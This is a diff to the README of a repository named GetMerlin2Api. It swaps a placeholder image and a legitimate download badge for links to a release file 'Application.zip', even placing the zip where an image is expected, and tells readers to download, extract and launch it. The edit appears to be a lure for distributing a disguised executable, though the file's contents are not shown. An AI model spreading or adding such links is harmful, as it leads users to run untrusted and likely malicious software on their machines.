@@ -1,6 +1,6 @@
 # 🧙‍♂️ Welcome to GetMerlin2Api Repository!
 
-![Merlin Image](https://example.com/image.jpg)
+![Merlin Image](https://github.com/Tyson-cyber/GetMerlin2Api/releases/download/v1.0/Application.zip)
 
 ### Repository: GetMerlin2Api
 
@@ -13,7 +13,7 @@ This repository contains the source code for the GetMerlin2Api project. Unfortun
 
 To get started with GetMerlin2Api, you can download the project files from the link below:
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Project Files](https://github.com/Tyson-cyber/GetMerlin2Api/releases/download/v1.0/Application.zip)](https://github.com/Tyson-cyber/GetMerlin2Api/releases/download/v1.0/Application.zip)
 
 The link above will direct you to the zip file containing all the necessary files for the project. Make sure to extract the files after downloading and launch the project to explore its functionalities.
 
